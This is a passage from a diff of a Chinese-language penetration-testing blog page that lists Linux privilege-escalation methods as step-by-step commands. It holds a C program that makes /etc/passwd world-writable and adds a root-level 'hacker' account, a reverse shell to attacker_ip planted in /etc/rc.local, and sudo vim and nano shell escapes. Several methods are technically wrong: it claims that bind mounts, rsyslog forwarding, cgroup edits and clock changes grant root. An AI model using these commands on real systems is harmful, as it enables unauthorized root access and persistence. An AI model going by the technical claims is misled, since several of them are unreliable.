+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 编译并执行</span>
+</span></span><span style="display:flex;"><span>gcc exploit.c -o exploit
+</span></span><span style="display:flex;"><span>./exploit
+</span></span></code></pre></div></li>
+</ol>
+<h3 id="exploitc示例">exploit.c示例<a hidden class="anchor" aria-hidden="true" href="#exploitc示例">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/ipc.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/shm.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">key_t</span> key <span style="color:#f92672">=</span> <span style="color:#a6e22e">ftok</span>(<span style="color:#e6db74">&#34;/tmp/shm&#34;</span>, <span style="color:#ae81ff">65</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> shmid <span style="color:#f92672">=</span> <span style="color:#a6e22e">shmget</span>(key, <span style="color:#ae81ff">1024</span>, IPC_CREAT <span style="color:#f92672">|</span> <span style="color:#ae81ff">0666</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>shmaddr <span style="color:#f92672">=</span> <span style="color:#a6e22e">shmat</span>(shmid, NULL, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 尝试获取root权限
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;chmod 777 /etc/passwd&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;echo &#39;hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0:Test User:/root:/bin/bash&#39; &gt;&gt; /etc/passwd&#34;</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="说明-9">说明<a hidden class="anchor" aria-hidden="true" href="#说明-9">#</a></h3>
+<p>通过System V IPC，攻击者可以利用共享内存、消息队列或信号量的配置错误，触发高权限操作。</p>
+<h2 id="三利用系统日志处理机制提权">三、利用系统日志处理机制提权<a hidden class="anchor" aria-hidden="true" href="#三利用系统日志处理机制提权">#</a></h2>
+<h3 id="原理-2">原理<a hidden class="anchor" aria-hidden="true" href="#原理-2">#</a></h3>
+<p>某些系统日志处理程序（如rsyslog）在处理日志文件时可能存在权限问题，允许低权限用户执行高权限命令。</p>
+<h3 id="利用步骤-11">利用步骤<a hidden class="anchor" aria-hidden="true" href="#利用步骤-11">#</a></h3>
+<ol>
+<li>
+<p><strong>查找日志处理配置</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep -r <span style="color:#e6db74">&#34;rsyslog&#34;</span> /etc/
+</span></span></code></pre></div></li>
+<li>
+<p><strong>检查日志文件权限</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -l /var/log/syslog
+</span></span></code></pre></div></li>
+<li>
+<p><strong>创建恶意日志文件</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;action(type=&#34;omfwd&#34; target=&#34;127.0.0.1&#34; port=&#34;514&#34; protocol=&#34;tcp&#34;)&#39;</span> &gt; /tmp/rsyslog.conf
+</span></span></code></pre></div></li>
+<li>
+<p><strong>触发日志处理</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>logger <span style="color:#e6db74">&#34;test&#34;</span>
+</span></span></code></pre></div><ul>
+<li>如果rsyslog配置允许，可能会执行恶意命令</li>
+</ul>
+</li>
+</ol>
+<h3 id="说明-10">说明<a hidden class="anchor" aria-hidden="true" href="#说明-10">#</a></h3>
+<p>如果rsyslog配置不当，攻击者可以通过日志文件触发高权限操作。</p>
+<h2 id="四利用系统时间戳提权">四、利用系统时间戳提权<a hidden class="anchor" aria-hidden="true" href="#四利用系统时间戳提权">#</a></h2>
+<h3 id="原理-3">原理<a hidden class="anchor" aria-hidden="true" href="#原理-3">#</a></h3>
+<p>某些系统服务在特定时间点执行高权限操作，攻击者可以通过修改系统时间触发这些操作。</p>
+<h3 id="利用步骤-12">利用步骤<a hidden class="anchor" aria-hidden="true" href="#利用步骤-12">#</a></h3>
+<ol>
+<li>
+<p><strong>查看系统时间</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>date
+</span></span></code></pre></div></li>
+<li>
+<p><strong>修改系统时间</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo date -s <span style="color:#e6db74">&#34;2023-01-01 00:00:00&#34;</span>
+</span></span></code></pre></div></li>
+<li>
+<p><strong>触发服务</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 某些服务在特定时间点执行</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 例如，cron任务在特定时间执行</span>
+</span></span></code></pre></div></li>
+</ol>
+<h3 id="说明-11">说明<a hidden class="anchor" aria-hidden="true" href="#说明-11">#</a></h3>
+<p>如果系统中有服务在特定时间点执行高权限操作（如备份、日志轮转），修改系统时间可能会触发这些操作。</p>
+<h2 id="五利用cgroups资源限制提权">五、利用cgroups资源限制提权<a hidden class="anchor" aria-hidden="true" href="#五利用cgroups资源限制提权">#</a></h2>
+<h3 id="原理-4">原理<a hidden class="anchor" aria-hidden="true" href="#原理-4">#</a></h3>
+<p>cgroups（控制组）用于限制、记录和隔离进程组的资源使用。如果配置不当，可能允许低权限用户提升权限。</p>
+<h3 id="利用步骤-13">利用步骤<a hidden class="anchor" aria-hidden="true" href="#利用步骤-13">#</a></h3>
+<ol>
+<li>
+<p><strong>检查cgroups配置</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /proc/self/cgroup
+</span></span></code></pre></div></li>
+<li>
+<p><strong>查找可修改的cgroups</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls /sys/fs/cgroup
+</span></span></code></pre></div></li>
+<li>
+<p><strong>修改cgroups配置</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 例如，修改内存限制</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#ae81ff">0</span> &gt; /sys/fs/cgroup/memory/memory.limit_in_bytes
+</span></span></code></pre></div></li>
+<li>
+<p><strong>触发权限提升</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 通过修改cgroups配置，触发系统行为变化</span>
+</span></span></code></pre></div></li>
+</ol>
+<h3 id="说明-12">说明<a hidden class="anchor" aria-hidden="true" href="#说明-12">#</a></h3>
+<p>通过修改cgroups配置，攻击者可能绕过资源限制，执行高权限操作。</p>
+<h2 id="六利用网络配置提权">六、利用网络配置提权<a hidden class="anchor" aria-hidden="true" href="#六利用网络配置提权">#</a></h2>
+<h3 id="原理-5">原理<a hidden class="anchor" aria-hidden="true" href="#原理-5">#</a></h3>
+<p>某些网络配置（如iptables规则）可能允许低权限用户执行高权限操作。</p>
+<h3 id="利用步骤-14">利用步骤<a hidden class="anchor" aria-hidden="true" href="#利用步骤-14">#</a></h3>
+<ol>
+<li>
+<p><strong>查看iptables规则</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>iptables -L
+</span></span></code></pre></div></li>
+<li>
+<p><strong>尝试添加规则</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo iptables -A INPUT -p tcp --dport <span style="color:#ae81ff">22</span> -j ACCEPT
+</span></span></code></pre></div></li>
+<li>
+<p><strong>触发高权限操作</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 通过修改网络配置，触发服务高权限操作</span>
+</span></span></code></pre></div></li>
+</ol>
+<h3 id="说明-13">说明<a hidden class="anchor" aria-hidden="true" href="#说明-13">#</a></h3>
+<p>如果iptables配置不当，攻击者可能通过添加规则触发高权限操作。</p>
+<h2 id="七利用系统快照和备份机制提权">七、利用系统快照和备份机制提权<a hidden class="anchor" aria-hidden="true" href="#七利用系统快照和备份机制提权">#</a></h2>
+<h3 id="原理-6">原理<a hidden class="anchor" aria-hidden="true" href="#原理-6">#</a></h3>
+<p>系统快照和备份机制可能配置不当，允许低权限用户执行高权限操作。</p>
+<h3 id="利用步骤-15">利用步骤<a hidden class="anchor" aria-hidden="true" href="#利用步骤-15">#</a></h3>
+<ol>
+<li>
+<p><strong>查找备份文件</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -name <span style="color:#e6db74">&#34;*.bak&#34;</span> 2&gt;/dev/null
+</span></span></code></pre></div></li>
+<li>
+<p><strong>修改备份文件</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0:Test User:/root:/bin/bash&#39;</span> &gt;&gt; /etc/passwd.bak
+</span></span></code></pre></div></li>
+<li>
+<p><strong>触发备份机制</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 某些备份程序会将备份文件应用到系统</span>
+</span></span></code></pre></div></li>
+</ol>
+<h3 id="说明-14">说明<a hidden class="anchor" aria-hidden="true" href="#说明-14">#</a></h3>
+<p>如果备份机制配置不当，攻击者可能通过修改备份文件，触发系统应用高权限配置。</p>
+<h2 id="八利用系统服务环境变量提权">八、利用系统服务环境变量提权<a hidden class="anchor" aria-hidden="true" href="#八利用系统服务环境变量提权">#</a></h2>
+<h3 id="原理-7">原理<a hidden class="anchor" aria-hidden="true" href="#原理-7">#</a></h3>
+<p>某些系统服务在启动时使用环境变量，如果配置不当，攻击者可以设置环境变量触发高权限操作。</p>
+<h3 id="利用步骤-16">利用步骤<a hidden class="anchor" aria-hidden="true" href="#利用步骤-16">#</a></h3>
+<ol>
+<li>
+<p><strong>查找系统服务</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>systemctl list-units --type<span style="color:#f92672">=</span>service
+</span></span></code></pre></div></li>
+<li>
+<p><strong>查看服务配置</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>systemctl cat &lt;service&gt;
+</span></span></code></pre></div></li>
+<li>
+<p><strong>设置环境变量</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>export SERVICE_ENV_VAR<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;malicious_value&#34;</span>
+</span></span></code></pre></div></li>
+<li>
+<p><strong>触发服务</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>systemctl restart &lt;service&gt;
+</span></span></code></pre></div></li>
+</ol>
+<h3 id="说明-15">说明<a hidden class="anchor" aria-hidden="true" href="#说明-15">#</a></h3>
+<p>通过设置环境变量，攻击者可以触发服务执行高权限操作。</p>
+<h2 id="九利用系统启动脚本提权">九、利用系统启动脚本提权<a hidden class="anchor" aria-hidden="true" href="#九利用系统启动脚本提权">#</a></h2>
+<h3 id="原理-8">原理<a hidden class="anchor" aria-hidden="true" href="#原理-8">#</a></h3>
+<p>系统启动脚本（如/etc/rc.local）可能配置不当，允许低权限用户在系统启动时执行高权限命令。</p>
+<h3 id="利用步骤-17">利用步骤<a hidden class="anchor" aria-hidden="true" href="#利用步骤-17">#</a></h3>
+<ol>
+<li>
+<p><strong>检查启动脚本</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /etc/rc.local
+</span></span></code></pre></div></li>
+<li>
+<p><strong>修改启动脚本</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/attacker_ip/4444 0&gt;&amp;1&#34;</span> &gt;&gt; /etc/rc.local
+</span></span></code></pre></div></li>
+<li>
+<p><strong>重启系统</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>reboot
+</span></span></code></pre></div></li>
+</ol>
+<h3 id="说明-16">说明<a hidden class="anchor" aria-hidden="true" href="#说明-16">#</a></h3>
+<p>通过修改系统启动脚本，攻击者可以在系统启动时获取shell。</p>
+<h2 id="十利用系统资源管理提权">十、利用系统资源管理提权<a hidden class="anchor" aria-hidden="true" href="#十利用系统资源管理提权">#</a></h2>
+<h3 id="原理-9">原理<a hidden class="anchor" aria-hidden="true" href="#原理-9">#</a></h3>
+<p>系统资源管理（如cgroups）可能配置不当，允许低权限用户提升权限。</p>
+<h3 id="利用步骤-18">利用步骤<a hidden class="anchor" aria-hidden="true" href="#利用步骤-18">#</a></h3>
+<ol>
+<li>
+<p><strong>查看cgroups配置</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /sys/fs/cgroup/cpu/cpu.cfs_quota_us
+</span></span></code></pre></div></li>
+<li>
+<p><strong>修改资源限制</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo -1 &gt; /sys/fs/cgroup/cpu/cpu.cfs_quota_us
+</span></span></code></pre></div></li>
+<li>
+<p><strong>触发权限提升</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 通过修改资源限制，触发系统行为变化</span>
+</span></span></code></pre></div></li>
+</ol>
+<h3 id="说明-17">说明<a hidden class="anchor" aria-hidden="true" href="#说明-17">#</a></h3>
+<p>通过修改cgroups配置，攻击者可能绕过资源限制，执行高权限操作。</p>
+<h1 id="实战测试优先顺序">实战测试优先顺序<a hidden class="anchor" aria-hidden="true" href="#实战测试优先顺序">#</a></h1>
+<p>在渗透测试中，提权是获取系统控制权的关键环节。以下是我根据实战经验整理的<strong>最高频、最实用</strong>的提权方式，包括常规和非常规方法，附详细操作步骤和原理说明。</p>
+<hr>
+<h2 id="一suid提权">一、SUID提权<a hidden class="anchor" aria-hidden="true" href="#一suid提权">#</a></h2>
+<h3 id="原理-10">原理<a hidden class="anchor" aria-hidden="true" href="#原理-10">#</a></h3>
+<p>SUID（Set User ID）是一种特殊文件权限，使文件在执行时以文件所有者（通常是root）的权限运行，而不是以执行者权限运行。</p>
+<h3 id="详细操作步骤">详细操作步骤<a hidden class="anchor" aria-hidden="true" href="#详细操作步骤">#</a></h3>
+<ol>
+<li>
+<p><strong>查找SUID文件</strong>（最常用命令）：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null | grep -E <span style="color:#e6db74">&#39;/bin|/usr/bin&#39;</span>
+</span></span></code></pre></div></li>
+<li>
+<p><strong>分析常见SUID文件</strong>：</p>
+<ul>
+<li><code>/bin/mount</code>：最常用</li>
+<li><code>/bin/ping</code>：现代系统可能已修复</li>
+<li><code>/usr/bin/gpasswd</code>：常用</li>
+<li><code>/usr/bin/chage</code>：较少见</li>
+</ul>
+</li>
+<li>
+<p><strong>利用/bin/mount提权</strong>（最可靠）：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 创建临时目录</span>
+</span></span><span style="display:flex;"><span>mkdir /tmp/mount
+</span></span><span style="display:flex;"><span>touch /tmp/mount/malicious_file
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 绑定挂载</span>
+</span></span><span style="display:flex;"><span>/bin/mount -o bind /tmp/mount /tmp/mount
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 触发挂载</span>
+</span></span><span style="display:flex;"><span>/bin/mount /tmp/mount /tmp/mount
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 检查权限</span>
+</span></span><span style="display:flex;"><span>ls -l /tmp/mount
+</span></span></code></pre></div><ul>
+<li><strong>原理</strong>：<code>mount</code>命令以root权限执行，通过bind挂载，将当前用户可写目录挂载到系统目录，实现权限提升</li>
+</ul>
+</li>
+<li>
+<p><strong>利用/usr/bin/gpasswd提权</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/bin/gpasswd -a username root
+</span></span></code></pre></div><ul>
+<li><strong>原理</strong>：gpasswd允许用户添加自己到root组，无需密码（如果配置正确）</li>
+</ul>
+</li>
+<li>
+<p><strong>验证提权</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 应该输出：root</span>
+</span></span></code></pre></div></li>
+</ol>
+<h3 id="实战技巧">实战技巧<a hidden class="anchor" aria-hidden="true" href="#实战技巧">#</a></h3>
+<ul>
+<li><strong>优先使用<code>/bin/mount</code></strong></li>
+<li><strong>使用<code>grep</code>过滤</strong>：避免输出过多无用信息</li>
+<li><strong>不要使用<code>sudo</code></strong>：SUID提权不需要sudo</li>
+</ul>
+<hr>
+<h2 id="二sudo配置错误提权">二、sudo配置错误提权<a hidden class="anchor" aria-hidden="true" href="#二sudo配置错误提权">#</a></h2>
+<h3 id="原理-11">原理<a hidden class="anchor" aria-hidden="true" href="#原理-11">#</a></h3>
+<p>sudo允许用户以root身份执行特定命令，如果配置不当（<code>NOPASSWD</code>），可直接提权。</p>
+<h3 id="详细操作步骤-1">详细操作步骤<a hidden class="anchor" aria-hidden="true" href="#详细操作步骤-1">#</a></h3>
+<ol>
+<li>
+<p><strong>查看当前用户sudo权限</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -l
+</span></span></code></pre></div></li>
+<li>
+<p><strong>常见配置错误</strong>（重点检查）：</p>
+<ul>
+<li><code>(ALL) NOPASSWD: ALL</code>：允许执行任意命令</li>
+<li><code>(ALL) NOPASSWD: /usr/bin/vim</code></li>
+<li><code>(ALL) NOPASSWD: /usr/bin/nano</code></li>
+<li><code>(ALL) NOPASSWD: /bin/bash</code></li>
+</ul>
+</li>
+<li>
+<p><strong>利用vim提权</strong>（最常用）：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo /usr/bin/vim
+</span></span></code></pre></div><ul>
+<li>
+<p>在vim中输入：</p>
+<pre tabindex="0"><code>:set shell=/bin/bash
+:shell
+</code></pre></li>
+<li>
+<p><strong>原理</strong>：vim允许设置shell，通过修改shell为/bin/bash，获得root shell</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>利用nano提权</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo /usr/bin/nano
+</span></span></code></pre></div><ul>
+<li>按 <code>Ctrl+R</code>，输入 <code>!bash</code>，回车</li>
+<li><strong>原理</strong>：nano允许执行shell命令，通过<code>!bash</code>获取root shell</li>
+</ul>
+</li>
+<li>
+<p><strong>验证提权</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 应该输出：root</span>
+</span></span></code></pre></div></li>
+</ol>
+<h3 id="实战技巧-1">实战技巧<a hidden class="anchor" aria-hidden="true" href="#实战技巧-1">#</a></h3>
+<ul>
+<li><strong>优先尝试<code>sudo -l</code></strong>：这是最直接的检查方式</li>
+<li><strong><code>sudo -l -n</code></strong>：如果<code>sudo -l</code>需要密码，尝试<code>-n</code>选项（不提示密码）</li>
+<li><strong>不要尝试<code>sudo su</code></strong>：如果配置允许，但通常需要密码</li>
+</ul>
+<hr>
+<h2 id="三passwd文件提权-1">三、passwd文件提权<a hidden class="anchor" aria-hidden="true" href="#三passwd文件提权-1">#</a></h2>
+<h3 id="原理-12">原理<a hidden class="anchor" aria-hidden="true" href="#原理-12">#</a></h3>
+<p>如果<code>/etc/passwd</code>文件对普通用户可写，可以直接添加一个root用户。</p>
+<h3 id="详细操作步骤-2">详细操作步骤<a hidden class="anchor" aria-hidden="true" href="#详细操作步骤-2">#</a></h3>
+<ol>
+<li>
+<p><strong>检查passwd文件权限</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -l /etc/passwd
+</span></span></code></pre></div><ul>
+<li>如果显示为<code>-rw-rw-r--</code>或<code>-rw-rw-rw-</code>，则可写</li>
+</ul>
+</li>
+<li>
+<p><strong>生成加密密码</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openssl passwd -1 -salt hacker <span style="color:#ae81ff">123456</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 输出示例：$1$hacker$6luIRwdGpBvXdP.GMwcZp/</span>
+</span></span></code></pre></div></li>
+<li>
+<p><strong>添加root用户</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;hacker:</span>$1$hacker$6<span style="color:#e6db74">luIRwdGpBvXdP.GMwcZp/:0:0:Test User:/root:/bin/bash&#34;</span> &gt;&gt; /etc/passwd
+</span></span></code></pre></div><ul>
+<li><strong>原理</strong>：UID 0 表示root用户</li>
+</ul>
+</li>
+<li>
+<p><strong>切换到新用户</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>su hacker
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 输入密码：123456</span>
+</span></span></code></pre></div></li>
+<li>
+<p><strong>验证提权</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 应该输出：uid=0(root) gid=0(root)</span>
+</span></span></code></pre></div></li>
+</ol>
+<h3 id="实战技巧-2">实战技巧<a hidden class="anchor" aria-hidden="true" href="#实战技巧-2">#</a></h3>
+<ul>
+<li><strong>优先检查权限</strong>：<code>ls -l /etc/passwd</code>是第一步</li>
+<li><strong>使用<code>openssl</code>生成密码</strong>：避免手动输入错误</li>
+<li><strong>如果<code>/etc/passwd</code>不可写</strong>：
+<ul>
+<li>检查<code>/etc/passwd.bak</code>或<code>/etc/passwd-</code>是否可写</li>
+<li>有时系统使用符号链接，修改链接目标</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="四内核漏洞提权实战中需匹配版本">四、内核漏洞提权（实战中需匹配版本)<a hidden class="anchor" aria-hidden="true" href="#四内核漏洞提权实战中需匹配版本">#</a></h2>
